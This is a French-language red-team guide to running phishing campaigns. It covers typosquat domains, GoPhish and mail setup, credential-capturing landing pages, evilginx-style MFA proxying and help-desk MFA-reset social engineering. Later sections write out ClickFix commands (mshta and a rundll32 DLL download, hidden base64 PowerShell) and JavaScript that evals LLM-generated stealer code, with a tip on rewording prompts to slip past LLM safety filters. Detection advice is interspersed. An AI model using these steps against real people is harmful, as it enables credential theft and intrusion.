# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Méthodologie

1. Recon the victim
1. Sélectionner le **victim domain**.
2. Faire une enumeration web de base en **recherchant des login portals** utilisés par la victime et **décider** lequel vous allez **impersonate**.
3. Utiliser un peu de **OSINT** pour **find emails**.
2. Préparer l'environnement
1. **Buy the domain** que vous allez utiliser pour l'évaluation de phishing
2. **Configure the email service** related records (SPF, DMARC, DKIM, rDNS)
3. Configurer le VPS avec **gophish**
3. Préparer la campaign
1. Préparer le **email template**
2. Préparer la **web page** pour voler les credentials
4. Lancer la campaign!

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword**: Le nom de domaine **contains** un **keyword** important du domaine original (e.g., zelster.com-management.com).
- **hypened subdomain**: Changez le **dot for a hyphen** d'un sous-domaine (e.g., www-zelster.com).
- **New TLD**: Même domaine en utilisant un **new TLD** (e.g., zelster.org)
- **Homoglyph**: Il **remplaces** une lettre du nom de domaine par des **letters that look similar** (e.g., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** Il **swap deux letters** à l'intérieur du nom de domaine (e.g., zelsetr.com).
- **Singularization/Pluralization**: Ajoute ou retire “s” à la fin du nom de domaine (e.g., zeltsers.com).
- **Omission**: Il **remove one** des lettres du nom de domaine (e.g., zelser.com).
- **Repetition:** Il **repeat one** des lettres du nom de domaine (e.g., zeltsser.com).
- **Replacement**: Comme homoglyph mais moins stealthy. Il remplace une des lettres du nom de domaine, peut-être par une lettre proche de la lettre d'origine sur le clavier (e.g, zektser.com).
- **Subdomained**: Introduire un **dot** à l'intérieur du nom de domaine (e.g., ze.lster.com).
- **Insertion**: Il **inserts a letter** dans le nom de domaine (e.g., zerltser.com).
- **Missing dot**: Ajouter le TLD au nom de domaine. (e.g., zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Il y a une **possibility que l'un de plusieurs bits stockés ou en communication soit automatiquement flipped** à cause de divers facteurs comme des solar flares, des cosmic rays, ou des hardware errors.

Lorsque ce concept est **applied to DNS requests**, il est possible que le **domain received by the DNS server** ne soit pas le même que le domaine initialement demandé.

Par exemple, une seule modification de bit dans le domaine "windows.com" peut le changer en "windnws.com."

Les attackers peuvent **take advantage of this by registering multiple bit-flipping domains** similaires au domaine de la victime. Leur intention est de rediriger les utilisateurs légitimes vers leur propre infrastructure.

Pour plus d'informations, lisez [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Buy a trusted domain

Vous pouvez rechercher sur [https://www.expireddomains.net/](https://www.expireddomains.net) un domaine expiré que vous pourriez utiliser.\
Afin de vous assurer que le domaine expiré que vous allez acheter **has already a good SEO** vous pouvez vérifier comment il est catégorisé dans :

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Discovering Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Afin de **discover more** adresses email valides ou **verify the ones** que vous avez déjà découvertes, vous pouvez vérifier si vous pouvez les brute-force sur les serveurs smtp de la victime. [Learn how to verify/discover email address here](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
De plus, n'oubliez pas que si les utilisateurs utilisent **any web portal to access their mails**, vous pouvez vérifier s'il est vulnérable au **username brute force**, et exploiter la vulnérabilité si possible.

## Configuring GoPhish

### Installation

Vous pouvez le télécharger depuis [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Téléchargez-le et décompressez-le dans `/opt/gophish` puis exécutez `/opt/gophish/gophish`\
Un mot de passe vous sera donné pour l'utilisateur admin sur le port 3333 dans la sortie. Par conséquent, accédez à ce port et utilisez ces identifiants pour changer le mot de passe admin. Vous devrez peut-être tunnel ce port vers local:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Configuration

**Configuration du certificat TLS**

Avant cette étape, vous devez avoir **déjà acheté le domaine** que vous allez utiliser et il doit être **pointé** vers **l'adresse IP du VPS** où vous configurez **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Configuration de la messagerie**

Commencez par installer : `apt-get install postfix`

Puis ajoutez le domaine aux fichiers suivants :

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Modifiez également les valeurs des variables suivantes dans /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Enfin, modifiez les fichiers **`/etc/hostname`** et **`/etc/mailname`** avec le nom de votre domaine et **redémarrez votre VPS.**

Créez maintenant un enregistrement **DNS A** de `mail.<domain>` pointant vers l'**adresse IP** du VPS et un enregistrement **DNS MX** pointant vers `mail.<domain>`

Testons maintenant l'envoi d'un email :
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Configuration de Gophish**

Arrêtez l'exécution de gophish et configurons-le.\
Modifiez `/opt/gophish/config.json` comme suit (notez l'utilisation de https) :
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Configurer le service gophish**

Afin de créer le service gophish pour qu'il puisse être démarré automatiquement et géré comme un service, vous pouvez créer le fichier `/etc/init.d/gophish` avec le contenu suivant :
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Terminez la configuration du service et vérifiez-le en faisant :
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Configurer le serveur mail et le domaine

### Attendre et être légitime

Plus un domaine est ancien, moins il a de chances d'être détecté comme spam. Vous devriez donc attendre le plus longtemps possible (au moins 1week) avant l'évaluation de phishing. moreover, si vous mettez une page sur un secteur à bonne réputation, la réputation obtenue sera meilleure.

Notez que même si vous devez attendre une semaine, vous pouvez terminer la configuration de tout maintenant.

### Configurer l'enregistrement Reverse DNS (rDNS)

Définissez un enregistrement rDNS (PTR) qui résout l'adresse IP du VPS vers le nom de domaine.

### Enregistrement Sender Policy Framework (SPF)

Vous devez **configurer un enregistrement SPF pour le nouveau domaine**. Si vous ne savez pas ce qu'est un enregistrement SPF [**lisez cette page**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Vous pouvez utiliser [https://www.spfwizard.net/](https://www.spfwizard.net) pour générer votre politique SPF (utilisez l'IP de la machine VPS)

![SPF Wizard form for generating an SPF record for a phishing domain](<../../images/image (1037).png>)

Ceci est le contenu qui doit être défini dans un enregistrement TXT à l'intérieur du domaine :
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Enregistrement Domain-based Message Authentication, Reporting & Conformance (DMARC)

Vous devez **configurer un enregistrement DMARC pour le nouveau domaine**. Si vous ne savez pas ce qu'est un enregistrement DMARC, [**lisez cette page**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Vous devez créer un nouvel enregistrement DNS TXT pointant le nom d'hôte `_dmarc.<domain>` avec le contenu suivant :
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Vous devez **configurer un DKIM pour le nouveau domaine**. Si vous ne savez pas ce qu'est un enregistrement DMARC [**lisez cette page**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Ce tutoriel est basé sur : [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> Vous devez concaténer les deux valeurs B64 que la clé DKIM génère :
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Testez votre score de configuration email

Vous pouvez le faire en utilisant [https://www.mail-tester.com/](https://www.mail-tester.com)\
Accédez simplement à la page et envoyez un email à l'adresse qu'ils vous donnent :
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Vous pouvez également **vérifier votre configuration email** en envoyant un email à `check-auth@verifier.port25.com` et en **lisant la réponse** (pour cela, vous devrez **ouvrir** le port **25** et voir la réponse dans le fichier _/var/mail/root_ si vous envoyez l'email en tant que root).\
Vérifiez que vous passez tous les tests:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Vous pourriez aussi envoyer **message à un Gmail sous votre contrôle**, et vérifier les **en-têtes de l’e-mail** dans votre boîte de réception Gmail, `dkim=pass` devrait être présent dans le champ d’en-tête `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Removing from Spamhouse Blacklist

The page [www.mail-tester.com](https://www.mail-tester.com) peut indiquer si votre domaine est bloqué par spamhouse. Vous pouvez demander la suppression de votre domaine/IP à: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Removing from Microsoft Blacklist

​​Vous pouvez demander la suppression de votre domaine/IP à [https://sender.office.com/](https://sender.office.com).

## Create & Launch GoPhish Campaign

### Sending Profile

- Définissez un **nom pour identifier** le profil d'expéditeur
- Décidez depuis quel compte vous allez envoyer les e-mails de phishing. Suggestions: _noreply, support, servicedesk, salesforce..._
- Vous pouvez laisser vides le nom d'utilisateur et le mot de passe, mais assurez-vous de cocher Ignore Certificate Errors

![Create & Launch GoPhish Campaign - Sending Profile: You can leave blank the username and password, but make sure to check the Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Il est recommandé d'utiliser la fonctionnalité "**Send Test Email**" pour tester que tout fonctionne.\
> Je recommanderais d'**envoyer les e-mails de test à des adresses 10min mails** afin d'éviter d'être mis en blacklist pendant les tests.

### Email Template

- Définissez un **nom pour identifier** le template
- Puis écrivez un **subject** (rien d'étrange, juste quelque chose que vous pourriez vous attendre à lire dans un e-mail normal)
- Assurez-vous d'avoir coché "**Add Tracking Image**"
- Écrivez le **email template** (vous pouvez utiliser des variables comme dans l'exemple suivant):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Notez que **pour augmenter la crédibilité de l'email**, il est recommandé d'utiliser une signature provenant d'un email du client. Suggestions :

- Envoyez un email à une **adresse inexistante** et vérifiez si la réponse contient une signature.
- Recherchez des **emails publics** comme info@ex.com ou press@ex.com ou public@ex.com, envoyez-leur un email et attendez la réponse.
- Essayez de contacter **un email valide découvert** et attendez la réponse

![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)

> [!TIP]
> Le Email Template permet aussi de **joindre des fichiers à envoyer**. Si vous souhaitez également voler des challenges NTLM à l’aide de fichiers/documents spécialement conçus [lisez cette page](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Écrivez un **nom**
- **Écrivez le code HTML** de la page web. Notez que vous pouvez **importer** des pages web.
- Marquez **Capture Submitted Data** et **Capture Passwords**
- Définissez une **redirection**

![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> En général, vous devrez modifier le code HTML de la page et faire des tests en local (peut-être avec un serveur Apache) **jusqu'à obtenir un résultat satisfaisant.** Ensuite, écrivez ce code HTML dans la case.\
> Notez que si vous devez **utiliser des ressources statiques** pour le HTML (peut-être certaines pages CSS et JS), vous pouvez les enregistrer dans _**/opt/gophish/static/endpoint**_ puis y accéder via _**/static/\<filename>**_

> [!TIP]
> Pour la redirection, vous pourriez **rediriger les utilisateurs vers la page web principale légitime** de la victime, ou les rediriger vers _/static/migration.html_ par exemple, afficher une **roue de chargement (**[**https://loading.io/**](https://loading.io)**) pendant 5 secondes puis indiquer que le processus a réussi**.

### Users & Groups

- Définissez un nom
- **Importez les données** (notez que pour utiliser le modèle de l'exemple, vous avez besoin du prénom, du nom de famille et de l'adresse email de chaque utilisateur)

![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)

### Campaign

Enfin, créez une campagne en sélectionnant un nom, le email template, la landing page, l'URL, le sending profile et le groupe. Notez que l'URL sera le lien envoyé aux victimes

Notez que le **Sending Profile permet d'envoyer un email de test pour voir à quoi ressemblera l'email de phishing final** :

![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)

> [!TIP]
> Je recommanderais d'**envoyer les emails de test à des adresses 10min mails** afin d'éviter d'être mis en liste noire pendant les tests.

Une fois que tout est prêt, lancez simplement la campagne !

## Website Cloning

Si pour une raison quelconque vous voulez cloner le site web, consultez la page suivante :


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

Dans certaines évaluations de phishing (principalement pour les Red Teams), vous voudrez aussi **envoyer des fichiers contenant une forme de backdoor** (peut-être un C2 ou peut-être simplement quelque chose qui déclenchera une authentification).\
Consultez la page suivante pour quelques exemples :


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

L'attaque précédente est assez astucieuse car vous usurpez un vrai site web et collectez les informations saisies par l'utilisateur. Malheureusement, si l'utilisateur n'a pas saisi le bon mot de passe ou si l'application que vous avez imitée est configurée avec 2FA, **ces informations ne vous permettront pas d'usurper l'utilisateur piégé**.

C'est là que des outils comme [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) et [**muraena**](https://github.com/muraenateam/muraena) sont utiles. Cet outil vous permettra de générer une attaque de type MitM. En gros, l'attaque fonctionne de la manière suivante :

1. Vous **usurpez la connexion** du vrai site web.
2. L'utilisateur **envoie** ses **identifiants** à votre fausse page et l'outil les envoie au vrai site web, **en vérifiant si les identifiants fonctionnent**.
3. Si le compte est configuré avec **2FA**, la page MitM demandera le code et, une fois que **l'utilisateur le saisit**, l'outil l'enverra à la vraie page web.
4. Une fois que l'utilisateur est authentifié, vous (en tant qu'attaquant) aurez **capturé les identifiants, le 2FA, le cookie et toute information** de chaque interaction pendant que l'outil effectue un MitM.

### Via VNC

Et si au lieu d’**envoyer la victime vers une page malveillante** ayant le même aspect que l’originale, vous l’envoyez vers une **session VNC avec un navigateur connecté à la vraie page web** ? Vous pourrez voir ce qu’elle fait, voler le mot de passe, le MFA utilisé, les cookies...\
Vous pouvez faire cela avec [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)

## Detecting the detection

Évidemment, l’une des meilleures façons de savoir si vous avez été démasqué est de **rechercher votre domaine dans des blacklists**. S’il apparaît listé, cela signifie d’une manière ou d’une autre que votre domaine a été détecté comme suspect.\
Une façon simple de vérifier si votre domaine apparaît dans une blacklist est d’utiliser [https://malwareworld.com/](https://malwareworld.com)

Cependant, il existe d’autres moyens de savoir si la victime **recherche activement une activité de phishing suspecte dans la nature** comme expliqué dans :


{{#ref}}
detecting-phising.md
{{#endref}}

Vous pouvez **acheter un domaine avec un nom très similaire** à celui de la victime **et/ou générer un certificat** pour un **sous-domaine** d’un domaine que vous contrôlez **contenant** le **mot-clé** du domaine de la victime. Si la **victime** effectue une quelconque **interaction DNS ou HTTP** avec ceux-ci, vous saurez qu’**elle recherche activement** des domaines suspects et vous devrez être très discret.

### Evaluate the phishing

Utilisez [**Phishious** ](https://github.com/Rices/Phishious) pour évaluer si votre email va finir dans le dossier spam ou s’il va être bloqué ou réussir.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Les campagnes d’intrusion modernes ignorent de plus en plus complètement les leurres par email et **ciblent directement le workflow du service desk / de récupération d’identité** pour contourner le MFA. L’attaque est totalement "living-off-the-land" : une fois que l’opérateur possède des identifiants valides, il pivote avec les outils d’administration intégrés – aucun malware n’est requis.

### Attack flow
1. Recon la victime
* Collectez des informations personnelles et professionnelles depuis LinkedIn, des fuites de données, GitHub public, etc.
* Identifiez les identités à forte valeur (cadres, IT, finance) et inventoriez le **processus exact du help-desk** pour la réinitialisation du mot de passe / MFA.
2. Ingénierie sociale en temps réel
* Appelez, utilisez Teams ou le chat du help-desk en usurpant la cible (souvent avec un **caller-ID spoofé** ou une **voix clonée**).
* Fournissez les informations personnelles (PII) précédemment collectées pour passer la vérification basée sur des connaissances.
* Convainquez l’agent de **réinitialiser le secret MFA** ou d’effectuer un **SIM-swap** sur un numéro mobile enregistré.
3. Actions immédiates après accès (≤60 min dans des cas réels)
* Établissez un point d’appui via n’importe quel portail SSO web.
* Énumérez AD / AzureAD avec les outils intégrés (aucun binaire déposé) :
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Mouvement latéral avec **WMI**, **PsExec**, ou des agents **RMM** légitimes déjà autorisés dans l’environnement.

### Detection & Mitigation
* Traitez la récupération d’identité du help-desk comme une **opération privilégiée** – exigez une authentification renforcée et l’approbation d’un manager.
* Déployez des règles **Identity Threat Detection & Response (ITDR)** / **UEBA** qui alertent sur :
* Méthode MFA modifiée + authentification depuis un nouvel appareil / une nouvelle géographie.
* Élévation immédiate du même principal (user-→-admin).
* Enregistrez les appels du help-desk et imposez un **rappel vers un numéro déjà enregistré** avant toute réinitialisation.
* Implémentez **Just-In-Time (JIT) / Privileged Access** afin que les comptes récemment réinitialisés n’héritent pas automatiquement de jetons à privilèges élevés.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Les groupes de commodité compensent le coût des opérations high-touch avec des attaques massives qui transforment **les moteurs de recherche et les réseaux publicitaires en canal de distribution**.

1. **SEO poisoning / malvertising** pousse un faux résultat tel que `chromium-update[.]site` en tête des annonces de recherche.
2. La victime télécharge un petit **first-stage loader** (souvent JS/HTA/ISO). Exemples observés par Unit 42 :
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Le loader exfiltre les cookies du navigateur + les bases de données d’identifiants, puis charge un **silent loader** qui décide – *en temps réel* – s’il faut déployer :
* RAT (par ex. AsyncRAT, RustDesk)
* ransomware / wiper
* composant de persistance (clé Run du registre + tâche planifiée)

### Hardening tips
* Bloquez les domaines nouvellement enregistrés et appliquez un **Advanced DNS / URL Filtering** sur les *search-ads* ainsi que sur les emails.
* Limitez l’installation de logiciels aux paquets MSI / Store signés, refusez l’exécution de `HTA`, `ISO`, `VBS` par stratégie.
* Surveillez les processus enfants des navigateurs qui ouvrent des installateurs :
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Chassez les LOLBins fréquemment abusés par les first-stage loaders (par ex. `regsvr32`, `curl`, `mshta`).

### Download-button click hijacking with TDS handoff
Certains faux portails logiciels conservent le `href` de téléchargement visible pointant vers la **vraie** URL GitHub/release mais détournent la **première** interaction utilisateur en JavaScript et envoient la victime dans une chaîne **Traffic Distribution System (TDS)** à la place.
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Traits clés :
- Le hook s’exécute généralement dans la phase de **capture** (`true`) sur `document`, donc il se déclenche avant les handlers du site.
- Chrome utilise souvent `mousedown` au lieu de `click` pour garder la redirection liée à un **user gesture** valide et améliorer le contournement du bloqueur de popups.
- Certaines variantes pré-ouvrent `about:blank` ou synthétisent des clics `<a target="_blank">` et n’assignent l’URL TDS qu’ensuite.
- Les limites côté browser résident souvent dans `localStorage`, donc le **premier clic** peut atteindre le malware tandis que les refresh/retries reviennent vers le lien visible, qui semble bénin.
- Le TDS peut filtrer selon le referrer, le domaine d’entrée, GEO, le fingerprint browser/device, les vérifications VPN/datacenter, le contexte du clic, et des compteurs par session, ce qui rend les relectures d’analystes non déterministes.

Idées défensives :
- Comparer le `href` **affiché** avec la cible de navigation **réelle** générée au moment du clic.
- Rechercher des handlers `document.addEventListener(..., true)` qui appellent à la fois `preventDefault()` et `stopImmediatePropagation()` autour de `window.open`, `about:blank`, ou de clics synthétiques sur des anchors.
- Traiter les clusters de domaines fraîchement enregistrés de téléchargement de software qui chargent tous la même étape CloudFront/JS comme un pattern à fort signal de SEO-poisoning/TDS.

### ClickFix depuis de fausses pages de vérification + fetches LOLBAS de type archive
Certaines branches TDS aboutissent à une fausse page de vérification (style Cloudflare/IUAM) qui demande à la victime d’exécuter un binaire Windows de confiance tel que :
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Notes:
- `mshta.exe` exécute le **HTA/VBScript au début de la réponse**, même si l’URL prétend être une archive `.7z`; les données d’archive ajoutées peuvent être un pur leurre.
- Les étapes suivantes mentent souvent encore sur le type de fichier (`.rtf` pour PowerShell, `.asar` pour Python, ZIPs avec des binaires paddés) puis passent à une **manual PE mapping / in-memory execution**.
- Si vous répondez à l’une de ces chaînes, conservez le **network + memory du premier run réussi** : les rejouages suivants peuvent n’afficher qu’un chemin d’installateur/SFX bénin ou échouer parce que la charge utile/la clé était liée à la session TDS d’origine.

### ClickFix DLL delivery tradecraft (fake CERT update)
* Leurre : advisory CERT national cloné avec un bouton **Update** qui affiche des instructions “fix” étape par étape. Les victimes sont invitées à lancer un batch qui télécharge une DLL et l’exécute via `rundll32`.
* Chaîne batch typique observée :
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` dépose la charge utile dans `%TEMP%`, une courte pause masque la latence network, puis `rundll32` appelle l’entrypoint exporté (`notepad`).
* La DLL beacon l’identité de l’hôte et interroge le C2 toutes les quelques minutes. Le tasking distant arrive sous forme de **base64-encoded PowerShell** exécuté en mode hidden et avec contournement de policy :
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Cela préserve la flexibilité du C2 (le serveur peut changer les tâches sans mettre à jour la DLL) et masque les fenêtres console. Recherchez des enfants PowerShell de `rundll32.exe` utilisant ensemble `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression`.
* Les défenseurs peuvent repérer des callbacks HTTP(S) de la forme `...page.php?tynor=<COMPUTER>sss<USER>` et des intervalles de polling de 5 minutes après le chargement de la DLL.

---

## AI-Enhanced Phishing Operations
Les attaquants enchaînent désormais des **LLM & voice-clone APIs** pour des leurres entièrement personnalisés et une interaction en temps réel.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|Générer et envoyer >100 k emails / SMS avec wording randomisé et tracking links.|
|Generative AI|Produire des emails *one-off* faisant référence à des M&A publiques, à des blagues internes issues des réseaux sociaux ; deep-fake de la voix du CEO dans une arnaque par rappel.|
|Agentic AI|Enregistrer de manière autonome des domaines, scraper l’open-source intel, rédiger les mails de l’étape suivante lorsqu’une victime clique mais ne soumet pas ses creds.|

**Défense :**
• Ajouter des **dynamic banners** mettant en évidence les messages envoyés depuis une automatisation non digne de confiance (via anomalies ARC/DKIM).
• Déployer des **voice-biometric challenge phrases** pour les requêtes téléphoniques à haut risque.
• Simuler en continu des leurres générés par l’IA dans les programmes de sensibilisation – les templates statiques sont obsolètes.

See also – agentic browsing abuse for credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

See also – AI agent abuse of local CLI tools and MCP (for secrets inventory and detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Les attaquants peuvent envoyer du HTML apparemment bénin et **générer le stealer au runtime** en demandant à une **trusted LLM API** du JavaScript, puis en l’exécutant dans le navigateur (par ex. `eval` ou `<script>` dynamique).

1. **Prompt-as-obfuscation :** encoder les exfil URLs/Base64 strings dans le prompt ; itérer le wording pour contourner les filtres de sécurité et réduire les hallucinations.
2. **Client-side API call :** au chargement, le JS appelle un LLM public (Gemini/DeepSeek/etc.) ou un proxy CDN ; seul le prompt/l’appel API est présent dans le HTML statique.
3. **Assemble & exec :** concaténer la réponse et l’exécuter (polymorphic per visit) :
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** le code généré personnalise l’appât (p. ex. LogoKit token parsing) et envoie les creds vers l’endpoint caché dans le prompt.

**Evasion traits**
- Le trafic cible des domaines LLM connus ou des proxys CDN réputés ; parfois via WebSockets vers un backend.
- Aucun payload statique ; le JS malveillant n’existe qu’après le rendu.
- Les générations non déterministes produisent des **stealers uniques** par session.

**Detection ideas**
- Exécuter des sandboxes avec JS activé ; signaler le **`eval`/dynamic script creation** au runtime issu de réponses LLM.
- Rechercher des POST front-end vers des APIs LLM immédiatement suivis de `eval`/`Function` sur le texte retourné.
- Alerter sur des domaines LLM non autorisés dans le trafic client, puis sur des POST de creds qui suivent.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
En plus du push-bombing classique, les opérateurs **forcent simplement une nouvelle inscription MFA** pendant l’appel au help-desk, annulant le token existant de l’utilisateur. Toute invite de connexion ultérieure paraît légitime pour la victime.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Surveiller les événements AzureAD/AWS/Okta où **`deleteMFA` + `addMFA`** se produisent **en quelques minutes depuis la même IP**.



